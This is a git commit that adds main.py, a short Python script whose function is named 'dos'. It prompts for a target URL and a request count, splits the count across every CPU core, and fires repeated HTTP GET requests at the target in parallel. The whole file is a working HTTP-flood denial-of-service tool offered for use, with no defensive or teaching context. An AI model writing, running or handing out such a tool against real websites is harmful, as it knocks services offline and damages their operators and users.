e0271ee2203c752bc4f25c52a88e1226dde0c9f2
sudo0272 <sudo0272@gmail.com>
2020-03-27 09:01:56 +0900

    implemented

---
+++ main.py
@@ -0,0 +1,28 @@
+import multiprocessing
+import parmap
+import requests
+
+
+def split_number(n, m):
+    if m == 1:
+        return [n]
+
+    equal = n // m
+    left = n - (n // m * m)
+
+    return [equal for i in range(m)] + [left]
+
+
+def dos(n, url):
+    for i in range(n):
+        requests.get(url)
+
+
+if __name__ == '__main__':
+    coresCount = multiprocessing.cpu_count()
+
+    target = input('URL: ')
+
+    targetCount = split_number(int(input('횟수: ')), coresCount)
+
+    parmap.map(dos, targetCount, target, pm_pbar=True, pm_processes=coresCount)
